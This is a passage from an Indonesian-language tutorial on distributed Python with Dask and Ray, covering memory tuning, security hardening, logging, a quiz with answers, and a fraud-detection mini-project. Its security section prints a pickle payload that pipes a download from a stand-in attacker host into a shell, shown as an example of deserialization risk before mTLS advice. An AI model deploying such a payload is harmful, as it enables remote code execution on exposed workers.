4. **Isolasi Lingkungan Worker Runtime:**
   - Gunakan environment runtime yang seragam secara deterministik (Docker Container Image tersinkronisasi) di seluruh Worker dan Driver Node. Perbedaan minor versi pustaka C (misal: `glibc` atau `numpy` C-API version mismatch) memicu *segmentation fault* diam-diam saat pertukaran data serialized.

---

# SEKSI 15 — OPTIMASI KINERJA & EFISIENSI SUMBER DAYA

### 1. Eliminasi Salinan Memori via PyArrow Backend
Sejak Dask dan Pandas mengintegrasikan backend PyArrow secara native, beralihlah dari obyek Python `string` dan `datetime` legacy ke tipe berbasis PyArrow:

```python
# Menghemat konsumsi RAM hingga 70% dan menaikkan parsing speed 4x lipat
ddf = dd.read_parquet(
    "data_path/",
    engine="pyarrow",
    dtype_backend="pyarrow"  # Menggunakan Arrow chunked memory arrays di balik layar
)
```

### 2. Tuning Spill-To-Disk Threshold
Pada `LocalCluster` atau node worker terdistribusi, atur ambang batas alokasi memori secara bertingkat untuk mencegah pembunuhan proses oleh kernel OS (`SIGKILL 9` via Linux OOM-Killer):

```python
cluster = LocalCluster(
    n_workers=8,
    threads_per_worker=1,
    memory_limit="8GB",              # Hard cap per worker
    memory_target_fraction=0.60,      # Mulai spill chunk ke disk saat memori mencapai 60%
    memory_spill_fraction=0.75,       # Spill agresif ke disk saat mencapai 75%
    memory_pause_fraction=0.85,       # Jeda worker eksekusi jika RAM mencapai 85%
    local_directory="/mnt/nvme-scratch/dask-spill" # Wajib arahkan ke NVMe disk berkecepatan tinggi
)
```

---

# SEKSI 16 — KEAMANAN & HARDENING

### 1. Bahaya Remote Code Execution (RCE) via Serialization Deserialization
Python `pickle` secara inheren tidak aman. Protokol pickle mampu merepresentasikan opcode eksekusi fungsi arbitrari:
```python
# PEMIKIRAN EKSPLOITASI: Worker mengeksekusi payload berbahaya via pickle
import os
class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("curl -s http://attacker.com/malware | sh",))
```
Jika port scheduler terdistribusi terbuka ke jaringan publik tanpa proteksi, penyerang dapat mengirimkan instruksi serialized berbahaya yang langsung dieksekusi dengan *privilege* worker.

### 2. Proteksi Mutual TLS (mTLS) & Token Authentication
Jangan pernah menjalankan scheduler Dask atau Ray pada antarmuka terbuka (`0.0.0.0`) tanpa enkripsi sertifikat TLS:

```python
from distributed.security import Security

# Konfigurasi mTLS Tingkat Produksi
sec = Security(
    tls_ca_file="/etc/ssl/certs/internal_ca.pem",
    tls_client_cert="/etc/ssl/certs/client_cert.pem",
    tls_client_key="/etc/ssl/certs/client_key.pem",
    require_encryption=True
)

client = Client("tls://scheduler.internal.mesh:8786", security=sec)
```

### 3. Worker Sandbox & Isolation
Pastikan worker process berjalan di bawah akun pengguna non-root OS (`daskuser`, `UID: 10001`), dengan akses file system yang dibatasi (*read-only root*, hanya area `/tmp/scratch` yang dapat ditulisi).

---

# SEKSI 17 — OBSERVABILITAS, LOGGING & DEBUGGING

### 1. Menginterpretasikan Dask Diagnostic Dashboard
Dask Dashboard (port default `8787`) adalah instrumen utama pemantauan komputasi terdistribusi:
- **Bytes Stored vs Spill:** Bar grafik memori horizontal. Warna **Cyan** menunjukkan memori aktif dalam RAM; warna **Oranye** menunjukkan data telah meluap (*spill*) ke disk; warna **Merah** menandakan worker kehabisan ruang dan terancam crash.
- **Task Stream (Horizontal Gantt Chart):** Menunjukkan eksekusi task per worker thread.
  - Warna solid: Waktu komputasi efektif.
  - Garis merah antar-blok: Waktu transfer transfer komunikasi IPC / jaringan antar worker. Jika garis merah mendominasi, DAG Anda mengalami *network-bottlenecked*.

### 2. Distributed Worker Logging
Gunakan adapter logging terstruktur yang mencatat konteks node dan partisi:

```python
import logging
from distributed import get_worker

logger = logging.getLogger("DistributedPipeline")

def traceable_worker_task(partition_chunk: pd.DataFrame) -> pd.DataFrame:
    try:
        # Mengambil metadata runtime worker saat ini
        worker = get_worker()
        worker_id = worker.id
        worker_ip = worker.address
    except ValueError:
        worker_id = "local-driver"
        worker_ip = "127.0.0.1"

    logger.info(
        "Memproses partisi analitik",
        extra={"worker_id": worker_id, "worker_ip": worker_ip, "row_count": len(partition_chunk)}
    )
    # Lakukan komputasi...
    return partition_chunk
```

---

# SEKSI 18 — RINGKASAN & CHEAT SHEET

### Pola Pemilihan Komputasi Paralel Python

```
                       Apakah Ukuran Data > RAM Fisik?
                                 /         \
                              YA             TIDAK
                             /                 \
            Perlu Kluster Multi-Node?       Apakah Terhambat GIL (CPU-Bound)?
                    /         \                          /         \
                  YA           TIDAK                   YA           TIDAK
                 /               \                    /               \
         [Dask / Ray Cluster]  [Polars Streaming /  [ProcessPool /    [ThreadPool /
                                Dask LocalCluster]   Numpy Vector]     AsyncIO]
```

### Command & API Reference

| Operasi | Sintaks / Library | Fungsi Utama |
| :--- | :--- | :--- |
| **Lazy Execution Decorator** | `@dask.delayed` / `@ray.remote` | Membungkus fungsi standar menjadi node eksekusi asinkron DAG. |
| **Trigger Computation** | `ddf.compute()` / `ray.get()` | Menjalankan seluruh DAG dan mengembalikan hasil akhir ke memori Driver. |
| **Shared Memory Broadcast** | `client.scatter(data)` / `ray.put(data)` | Menyimpan array besar di memori global/shared agar worker tidak menduplikasi transfer. |
| **Inspect Partitions** | `ddf.npartitions` | Mengecek jumlah pecahan partisi yang menyusun distributed dataframe. |
| **Repartitioning** | `ddf.repartition(partition_size="150MB")` | Mengatur ulang distribusi dan ukuran chunk untuk mencegah data skew. |
| **Custom Partition Apply**| `ddf.map_partitions(func)` | Mengaplikasikan logika Pandas native secara paralel ke setiap chunk mandiri. |

---

# SEKSI 19 — KUIS EVALUASI PEMAHAMAN

### Soal Tingkat Dasar (Basic)

1. **Mengapa eksekusi loop Python murni di dalam `threading.Thread` gagal memanfaatkan seluruh inti CPU multi-core pada sistem operasi modern?**  
   *Jawaban:* Karena adanya CPython *Global Interpreter Lock* (GIL). Mutex ini membatasi eksekusi bytecode Python hanya pada satu thread OS dalam satu waktu per proses, sehingga thread lain terblokir saat satu thread mengeksekusi operasi CPU-bound.

2. **Apa yang dimaksud dengan konsep *Lazy Evaluation* pada framework data terdistribusi?**  
   *Jawaban:* Suatu strategi evaluasi di mana pemanggilan operasi analitik tidak langsung menghitung hasil numerik, melainkan mencatat metadata operasi tersebut ke dalam sebuah struktur graf dependensi (DAG). Komputasi fisik hanya dijalankan ketika hasil akhir diminta secara eksplisit (misal melalui `.compute()`).

3. **Mengapa format file Apache Parquet jauh lebih disukai dibandingkan format CSV untuk komputasi analitik terdistribusi?**  
   *Jawaban:* Parquet adalah format kolumnar biner terkompresi yang menyertakan metadata skema dan statistik partisi (*min/max values per row group*). Hal ini memungkinkan teknik *projection pushdown* (hanya membaca kolom relevan) dan *predicate pushdown* (melewati blok baris tanpa membaca seluruh file), sementara CSV bersifat berbasis baris teks yang wajib dipindai secara menyeluruh.

4. **Kapan Anda sebaiknya memilih model eksekusi `multiprocessing` dibandingkan `threading` di Python?**  
   *Jawaban:* `multiprocessing` digunakan saat beban kerja bersifat CPU-Bound (misal: transformasi numerik non-vektor, enkripsi, parsing manual) untuk melewati batasan GIL dengan menginstansiasi proses independen. `threading` optimal saat beban kerja bersifat I/O-Bound (misal: network scraping, HTTP calls, query database eksternal).

5. **Apa fungsi utama dari Dask LocalCluster scheduler parameter `memory_limit`?**  
   *Jawaban:* Menentukan batas maksimum alokasi memori fisik RAM yang diizinkan untuk dikonsumsi oleh satu proses worker sebelum scheduler mengaktifkan mekanisme proteksi *spill-to-disk* atau membatasi alokasi task baru guna mencegah *Out-of-Memory (OOM) Crash*.

---

### Soal Tingkat Lanjut (Intermediate)

6. **Berdasarkan Hukum Amdahl, jika 20% kode pipeline data Anda berjalan secara sekuensial pada node master (misal: parsing config dan sinkronisasi disk tunggal), berapa akselerasi teoritis maksimum yang bisa dicapai meskipun Anda menambahkan 1.000 worker node?**  
   *Jawaban:*  
   Fraksi sekuensial $(1 - p) = 0.20$.  
   Berdasarkan formula Amdahl:  
   $$\lim_{N \to \infty} S(N) = \frac{1}{1 - p} = \frac{1}{0.20} = 5\times$$  
   Percepatan sistem tidak akan pernah melampaui batas teoretis **$5\times$**, berapapun jumlah worker node yang ditambahkan.

7. **Jelaskan perbedaan mekanis mendasar antara operasi Narrow Dependency dan Wide Dependency pada Dask/Ray! Berikan contoh fungsinya masing-masing.**  
   *Jawaban:*  
   - *Narrow Dependency:* Setiap partisi pada layer turunan hanya bergantung pada satu (atau jumlah tetap yang independen) partisi pada layer induk. Operasi ini tidak memerlukan komunikasi data antar worker node. Contoh: `df['col'] * 2` atau `df.dropna()`.  
   - *Wide Dependency:* Partisi turunan membutuhkan agregasi data dari banyak atau seluruh partisi pada layer induk, memicu pertukaran data masif lintas jaringan/worker (*Data Shuffling*). Contoh: `df.groupby('key').mean()` atau `df.sort_values('ts')`.

8. **Bagaimana mekanisme Zero-Copy Serialization pada Apache Arrow (misal pada Plasma Object Store Ray) mengoptimalkan transfer data antar proses dibandingkan Pickle standar?**  
   *Jawaban:*  
   Pickle mengonversi obyek Python menjadi representasi byte stream, lalu proses penerima harus mengalokasikan memori baru dan merekonstruksi pointer CPython secara mendalam (*deep deserialization*). Apache Arrow memformat struktur data tabular langsung ke blok memori bersama (*shared memory buffer*) dengan spesifikasi biner standar. Proses lain dapat langsung memetakan pointer memori tersebut via *memory-mapping* (`mmap`) dan membaca array secara native tanpa alokasi ulang atau deserialisasi CPU.

9. **Apa risiko arsitektur terbesar jika sebuah pipeline Dask memiliki terlalu banyak partisi berukuran mikro (misal: 100.000 partisi dengan ukuran masing-masing 50 KB)?**  
   *Jawaban:*  
   Terjadinya *Scheduling Overhead Explosion*. Setiap partisi merepresentasikan setidaknya satu node di dalam graf dependensi (DAG). 100.000 partisi dapat menghasilkan jutaan sub-task. Overhead komunikasi serialisasi graph, alokasi antrean task oleh scheduler, dan network ping antar worker akan memakan waktu dan memori yang jauh lebih besar daripada waktu eksekusi aktual data itu sendiri, bahkan berisiko membuat Driver Node mengalami OOM.

10. **Bagaimana Anda mengatasi skenario Data Skew saat melakukan operasi `merge` atau `groupby` antar dua dataset terdistribusi?**  
    *Jawaban:*  
    Mengimplementasikan teknik *Salting* dan *Broadcast Join*:  
    - Untuk key yang memiliki frekuensi kemunculan ekstrem, tambahkan akhiran acak (*salt*) pada key tersebut untuk mendistribusikan data ke partisi-partisi paralel yang berbeda, lakukan agregasi parsial, lalu agregasi ulang tanpa salt.  
    - Jika salah satu tabel berukuran kecil ($< 100\text{ MB}$), hindari shuffling global dengan menyebarkan seluruh dataset kecil tersebut ke setiap worker node menggunakan *Broadcast Variable* (`client.scatter`).

---

# SEKSI 20 — TANTANGAN MANDIRI & MINI PROJECT PRAKTIKUM

### Rancang Bangun: Out-of-Core Fraud Detection Engine

**Skenario Bisnis:**
Sebuah platform fintech memproses rata-rata 10 juta transaksi kartu kredit dalam sepekan. Anda ditugaskan membangun pipeline analitik deteksi anomali yang harus mampu mengeksekusi komputasi pada laptop standar (RAM 8 GB - 16 GB) tanpa melampaui batas alokasi 4 GB RAM.

**Spesifikasi Persyaratan Teknis:**
1. **Generator Data Mandiri:** Tulis modul Python yang menghasilkan sekurang-kurangnya **3.000.000 baris rekaman transaksi sintetik** terdistribusi ke dalam 10 file Parquet independen di disk lokal.
   - Kolom skema: `transaction_id` (str), `user_id` (int), `amount` (float), `merchant_category` (str), `timestamp` (datetime), `device_trust_score` (float).
2. **Cluster Constraints:** Inisialisasi Dask `LocalCluster` dengan parameter ketat:
   - `n_workers=2`
   - `threads_per_worker=2`
   - `memory_limit="2GB"` per worker.
3. **Pipeline Analitik Terdistribusi:**
   - Baca seluruh dataset menggunakan `dd.read_parquet` berbasis backend PyArrow.
   - Hitung nilai *z-score* dari `amount` per `merchant_category` menggunakan transformasi out-of-core.
   - Deteksi transaksi anomali (*fraud candidates*) di mana `z_score > 3.0` DAN `device_trust_score < 0.20`.
   - Hitung rasio fraud per hari per kategori merchant.
4. **Target Output:**
   - Ekspor transaksi anomali yang terdeteksi ke direktori terpartisi berdasarkan tanggal transaksi: `/curated_fraud_lake/year=YYYY/month=MM/` dengan format kompresi Parquet Snappy.
5. **Kriteria Kelulusan (Verification Acceptance):**
   - Pipeline dieksekusi dari awal hingga akhir tanpa pernah memicu memory usage warning OS atau process termination (`Exit Code 137`).
   - Kode menyertakan penanganan resource lifecycle yang disiplin via blok `try...finally` untuk mematikan cluster dan menghapus buffer scratch disk.